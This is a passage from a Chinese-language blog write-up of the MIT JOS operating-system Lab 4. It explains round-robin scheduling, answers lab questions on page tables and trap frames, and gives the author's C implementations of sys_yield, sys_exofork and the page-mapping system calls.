class="line">    i = (env_index == NENV - <span class="number">1</span>) ? <span class="number">0</span> : env_index + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// traverse through envs list to find first ENV_RUNNABLE</span></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">for</span> (; i != env_index; i = ((i == NENV - <span class="number">1</span>) ? <span class="number">0</span> : i + <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (envs[i].env_status == ENV_RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// found, set idle and break from loop</span></span><br><span class="line">        idle = &amp;envs[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if idle is NULL and curenv_flag is true,</span></span><br><span class="line"><span class="comment">// means no envs are runnable and last previous running env is ENV_RUNNING</span></span><br><span class="line"><span class="comment">// check if last previous environment is ENV_RUNNING,</span></span><br><span class="line"><span class="comment">// if so, choose it.</span></span><br><span class="line"><span class="keyword">if</span> (!idle &amp;&amp; curenv_flag &amp;&amp; envs[env_index].env_status == ENV_RUNNING) &#123;</span><br><span class="line">    idle = &amp;envs[env_index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idle) &#123;</span><br><span class="line">    <span class="comment">// idle env choosed, run it directly</span></span><br><span class="line">    env_run(idle);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// failed to choose idle env, halt CPU</span></span><br><span class="line">    <span class="comment">// sched_halt never returns</span></span><br><span class="line">    sched_halt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/syscall.c, syscall():</span></span><br><span class="line"><span class="comment">// code added:</span></span><br><span class="line"><span class="keyword">case</span> SYS_yield:</span><br><span class="line">    <span class="comment">// call sys_yield</span></span><br><span class="line">    sys_yield();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/init.c, i386_init():</span></span><br><span class="line"><span class="comment">// code modified:</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(TEST)</span></span><br><span class="line">    <span class="comment">// Don't touch -- used by grading script!</span></span><br><span class="line">    ENV_CREATE(TEST, ENV_TYPE_USER);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">// Touch all you want.</span></span><br><span class="line">    <span class="comment">// create three user_yield</span></span><br><span class="line">    <span class="comment">// code MODIFIED here</span></span><br><span class="line">    ENV_CREATE(user_yield, ENV_TYPE_USER);</span><br><span class="line">    ENV_CREATE(user_yield, ENV_TYPE_USER);</span><br><span class="line">    ENV_CREATE(user_yield, ENV_TYPE_USER);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    <span class="comment">// TEST*</span></span></span><br></pre></td></tr></table></figure></p>
<p>问题3：<br>地址切换前后的页表中，<code>e</code>指向的虚拟地址都被同一块物理页映射。出现这种情况的原因在于<code>env</code>的<code>env_pgdir</code>是以<code>kern_pgdir</code>为原型产生的，<code>e</code>出于UTOP之上的地址，而UTOP以上的地址的映射关系在两个页表中是一样的。</p>
<p>问题4：<br>当发生地址转换时一定是从用户陷入内核之后，无论以何种方式陷入内核，必须要经过<code>kern/trap.c</code>中的<code>trap()</code>函数。观察该函数，可以发现，当从用户模式陷入内核时，代码将内核栈中的<code>tf</code>（包括页表和寄存器等）拷贝至内核间共享的对应的<code>env</code>中，所以之后寄存器状态才能恢复。</p>
<h4 id="环境创建的系统调用"><a href="#环境创建的系统调用" class="headerlink" title="环境创建的系统调用"></a>环境创建的系统调用</h4><p>尽管内核已经可以运行并在不同环境间切换了，但内核任然被限制了只能执行内核初始设置的用户环境。<br>需要实现必要的系统调用使得JOS可以允许用户环境创建和启动其他的用户环境。</p>
<p>Unix提供了<code>fork()</code>作为它的进程创建原语。Unix的<code>fork()</code>拷贝调用进程（父进程）的整个地址空间以创建子进程。<br>从用户空间来看，父子进程唯一可观察的差异就是它们的进程ID和父进程ID（通过<code>gitpid()</code>和<code>getppid()</code>返回。在父进程中，<code>fork()</code>返回子进程ID；在子进程中，<code>fork()</code>返回0。默认情况下，每个进程均获得其私有的地址空间，并且任意一个进程对于内存的修改对于其他进程都是不可见的。</p>
<p>将要实现一个不同的、更加原始的JOS系统调用原语集合去创建新的用户模式环境，通过这些系统调用，除了其他类型的环境创建以外，将能够在用户空间实现一个完整的类Unix<code>fork()</code>系统调用。需要实现的系统调用为：</p>
<ul>
<li><code>sys_exofork</code> - 创建一个几乎空白的新环境：在地址空间没有任何的用户映射，并且也无法运行。新环境将会有和父环境在执行<code>sys_exofork</code>系统调用时完全一致的寄存器状态。在父进程中，<code>sys_exofork</code>会返回新创建环境的<code>envid_t</code>（若环境创建错误则返回一个错误码）；子进程则会返回0（因为子进程最初被标记为不可运行，直到父进程通过显式标记子进程可运行之后，<code>sys_exofork</code>返回。</li>
<li><code>sys_env_set_status</code> - 设置指定的环境的状态为ENV_RUNNABLE或是ENV_NOT_RUNNABLE。该系统调用通常在一个新环境的地址空间和寄存器状态完全初始化之后标记其为可运行。</li>
<li><code>sys_page_alloc</code> - 分配一页的物理内存并将其映射到给定环境地址空间的给定虚拟地址。</li>
<li><code>sys_page_alloc</code> - 将一页映射（而不是实际的页内容）从一个环境的地址空间拷贝至另一个，共享内存使得新映射和旧映射指向同一页物理内存。</li>
<li><code>sys_page_unmap</code> - 将给定环境的给定虚拟地址的页面解除映射。</li>
</ul>
<p>上述所有的系统调用接受环境ID，内核支持将0到“当前环境”转换，在<code>kern/env.c</code>中的<code>envid2env()</code>实现。</p>
<p>已经在<code>user/dumpfork.c</code>中提供了非常原始的类Unix的<code>fork()</code>实现。测试程序用上述系统调用创建并运行一个当前地址空间拷贝的子进程，然后两个环境使用<code>sys_yield()</code>来回切换。父进程在10次迭代后退出；子进程在20次迭代后退出。</p>
<p>练习7的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In sys_exofork():</span></span><br><span class="line"><span class="comment">// Allocate a new environment.</span></span><br><span class="line"><span class="comment">// Returns envid of new environment, or &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_NO_FREE_ENV if no free environment is available.</span></span><br><span class="line"><span class="comment">//  -E_NO_MEM on memory exhaustion.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> envid_t <span class="title">sys_exofork</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create the new environment with env_alloc(), from kern/env.c.</span></span><br><span class="line">    <span class="comment">// It should be left as env_alloc created it, except that</span></span><br><span class="line">    <span class="comment">// status is set to ENV_NOT_RUNNABLE, and the register set is copied</span></span><br><span class="line">    <span class="comment">// from the current environment -- but tweaked so sys_exofork</span></span><br><span class="line">    <span class="comment">// will appear to return 0.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// get env_id of current environment</span></span><br><span class="line">    <span class="keyword">envid_t</span> parent_id = thiscpu-&gt;cpu_env-&gt;env_id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use env_alloc to create new environment and</span></span><br><span class="line">    <span class="comment">// do some basic setup(status and register set)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (env_alloc(&amp;env, parent_id) &lt; <span class="number">0</span>) &#123; panic(<span class="string">"sys_exofork failed!"</span>); &#125;</span><br><span class="line">    env-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">    env-&gt;env_tf     = thiscpu-&gt;cpu_env-&gt;env_tf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// do the trick to set eax register of newly</span></span><br><span class="line">    <span class="comment">// alloc environment to 0</span></span><br><span class="line">    env-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return new environment's ID</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;env_id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_exofork not implemented");</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In sys_env_set_status():</span></span><br><span class="line"><span class="comment">// Set envid's env_status to status, which must be ENV_RUNNABLE</span></span><br><span class="line"><span class="comment">// or ENV_NOT_RUNNABLE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//		or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if status is not a valid status for an environment.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_env_set_status</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">int</span> status)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Hint: Use the 'envid2env' function from kern/env.c to translate an</span></span><br><span class="line">    <span class="comment">// envid to a struct Env.</span></span><br><span class="line">    <span class="comment">// You should set envid2env's third argument to 1, which will</span></span><br><span class="line">    <span class="comment">// check whether the current environment has permission to set</span></span><br><span class="line">    <span class="comment">// envid's status.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="comment">// check status passed in</span></span><br><span class="line">    <span class="keyword">if</span> (status != ENV_RUNNABLE &amp;&amp; status != ENV_NOT_RUNNABLE) &#123;</span><br><span class="line">        <span class="comment">// invalid status</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="comment">// call envid2env to translate envid passed in</span></span><br><span class="line">    <span class="keyword">if</span> (envid2env(envid, &amp;env, <span class="literal">true</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// bad environment</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// set status</span></span><br><span class="line">    env-&gt;env_status = status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_env_set_status not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In sys_page_alloc():</span></span><br><span class="line"><span class="comment">// Allocate a page of memory and map it at 'va' with permission</span></span><br><span class="line"><span class="comment">// 'perm' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// The page's contents are set to 0.</span></span><br><span class="line"><span class="comment">// If a page is already mapped at 'va', that page is unmapped as a</span></span><br><span class="line"><span class="comment">// side effect.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// perm -- PTE_U | PTE_P must be set, PTE_AVAIL | PTE_W may or may not be set,</span></span><br><span class="line"><span class="comment">//         but no other bits may be set.  See PTE_SYSCALL in inc/mmu.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//      or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if perm is inappropriate (see above).</span></span><br><span class="line"><span class="comment">//  -E_NO_MEM if there's no memory to allocate the new page,</span></span><br><span class="line"><span class="comment">//      or to allocate any necessary page tables.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_page_alloc</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Hint: This function is a wrapper around page_alloc() and</span></span><br><span class="line">    <span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line">    <span class="comment">//   Most of the new code you write should be to check the</span></span><br><span class="line">    <span class="comment">//   parameters for correctness.</span></span><br><span class="line">    <span class="comment">//   If page_insert() fails, remember to free the page you</span></span><br><span class="line">    <span class="comment">//   allocated!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="comment">// check and get env</span></span><br><span class="line">    <span class="keyword">if</span> (envid2env(envid, &amp;env, <span class="literal">true</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// envid not exist or permission error</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check va</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)va &gt;= UTOP || PGOFF(va) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// va above UTOP or va is not page-aligned</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check perm</span></span><br><span class="line">    <span class="keyword">if</span> ((perm &amp; (~PTE_SYSCALL)) || !(perm &amp; PTE_U) || !(perm &amp; PTE_P)) &#123;</span><br><span class="line">        <span class="comment">// invalid perm</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate page and then insert it</span></span><br><span class="line">    <span class="comment">// check if out of memory</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((page = page_alloc(ALLOC_ZERO)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// failed to allocate page</span></span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (page_insert(env-&gt;env_pgdir, page, va, perm) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// page table couldn't be allocated</span></span><br><span class="line">        <span class="comment">// free ununsed page</span></span><br><span class="line">        page_free(page);</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_page_alloc not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// page successfully allocated</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In sys_page_map():</span></span><br><span class="line"><span class="comment">// Map the page of memory at 'srcva' in srcenvid's address space</span></span><br><span class="line"><span class="comment">// at 'dstva' in dstenvid's address space with permission 'perm'.</span></span><br><span class="line"><span class="comment">// Perm has the same restrictions as in sys_page_alloc, except</span></span><br><span class="line"><span class="comment">// that it also must not grant write access to a read-only</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if srcenvid and/or dstenvid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//      or the caller doesn't have permission to change one of them.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if srcva &gt;= UTOP or srcva is not page-aligned,</span></span><br><span class="line"><span class="comment">//      or dstva &gt;= UTOP or dstva is not page-aligned.</span></span><br><span class="line"><span class="comment">//  -E_INVAL is srcva is not mapped in srcenvid's address space.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if perm is inappropriate (see sys_page_alloc).</span></span><br><span class="line"><span class="comment">//  -E_INVAL if (perm &amp; PTE_W), but srcva is read-only in srcenvid's</span></span><br><span class="line"><span class="comment">//      address space.</span></span><br><span class="line"><span class="comment">//  -E_NO_MEM if there's no memory to allocate any necessary page tables.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_page_map</span><span class="params">(<span class="keyword">envid_t</span> srcenvid, <span class="keyword">void</span> *srcva, <span class="keyword">envid_t</span> dstenvid,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">void</span> *dstva, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Hint: This function is a wrapper around page_lookup() and</span></span><br><span class="line">    <span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line">    <span class="comment">//   Again, most of the new code you write should be to check the</span></span><br><span class="line">    <span class="comment">//   parameters for correctness.</span></span><br><span class="line">    <span class="comment">//   Use the third argument to page_lookup() to</span></span><br><span class="line">    <span class="comment">//   check the current permissions on the page.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">srcenv</span>, *<span class="title">dstenv</span>;</span></span><br><span class="line">    <span class="comment">// check environment</span></span><br><span class="line">    <span class="keyword">if</span> ((envid2env(srcenvid, &amp;srcenv, <span class="literal">true</span>) &lt; <span class="number">0</span>) ||</span><br><span class="line">        (envid2env(dstenvid, &amp;dstenv, <span class="literal">true</span>) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">// srcenvid or dstenvid doesn't exist or</span></span><br><span class="line">        <span class="comment">// caller doesn't have permissions</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check srcva and dstva about address and page-aligned</span></span><br><span class="line">    <span class="comment">// get srcenv and dstenv</span></span><br><span class="line">    <span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)srcva &gt;= UTOP) || ((<span class="keyword">uintptr_t</span>)dstva &gt;= UTOP) ||</span><br><span class="line">        (PGOFF(srcva) != <span class="number">0</span>) || (PGOFF(dstva) != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">// addresses above UTOP or addresses not page_aligned</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">srcpage</span>;</span></span><br><span class="line">    <span class="keyword">pte_t</span> *          scrpte_ptr;</span><br><span class="line">    <span class="comment">// use page look up to get source page and corresponding pte_t *</span></span><br><span class="line">    <span class="keyword">if</span> ((srcpage = page_lookup(srcenv-&gt;env_pgdir, srcva, &amp;scrpte_ptr)) ==</span><br><span class="line">        <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// srcva not mapped in srcenvid's address space</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check perm passed in</span></span><br><span class="line">    <span class="keyword">if</span> ((perm &amp; (~PTE_SYSCALL)) || !(perm &amp; PTE_U) || !(perm &amp; PTE_P)) &#123;</span><br><span class="line">        <span class="comment">// invalid perm</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if srcva is writable if perm has PTE_W</span></span><br><span class="line">    <span class="keyword">if</span> ((perm &amp; PTE_W) &amp;&amp; (!((*scrpte_ptr) &amp; PTE_W))) &#123;</span><br><span class="line">        <span class="comment">// perm has PTE_W while srcva ISN'T writable</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// insert source page into dstenv's pgdir with perm</span></span><br><span class="line">    <span class="comment">// check if out of memory</span></span><br><span class="line">    <span class="keyword">if</span> (page_insert(dstenv-&gt;env_pgdir, srcpage, dstva, perm) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// out of memory to allocate page table</span></span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_page_map not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// page successfully mapped</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In sys_page_unmap():</span></span><br><span class="line"><span class="comment">// Unmap the page of memory at 'va' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// If no page is mapped, the function silently succeeds.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//  -E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//      or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//  -E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sys_page_unmap</span><span class="params">(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Hint: This function is a wrapper around page_remove().</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line">    <span class="comment">// check and get env</span></span><br><span class="line">    <span class="keyword">if</span> (envid2env(envid, &amp;env, <span class="literal">true</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// envid not exist or permission error</span></span><br><span class="line">        <span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check va</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)va &gt;= UTOP || PGOFF(va) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// va above UTOP or va is not page-aligned</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call page_remove to unmap page</span></span><br><span class="line">    page_remove(env-&gt;env_pgdir, va);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// panic("sys_page_unmap not implemented");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// page successfully unmapped</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In syscall():</span></span><br><span class="line"><span class="comment">// new code added</span></span><br><span class="line"><span class="keyword">case</span> SYS_exofork:</span><br><span class="line">    <span class="comment">// call sys_exofork</span></span><br><span class="line">    <span class="keyword">return</span> sys_exofork();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_env_set_status:</span><br><span class="line">    <span class="comment">// call sys_env_set_status</span></span><br><span class="line">    <span class="keyword">return</span> sys_env_set_status((<span class="keyword">envid_t</span>)a1, (<span class="keyword">int</span>)a2);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 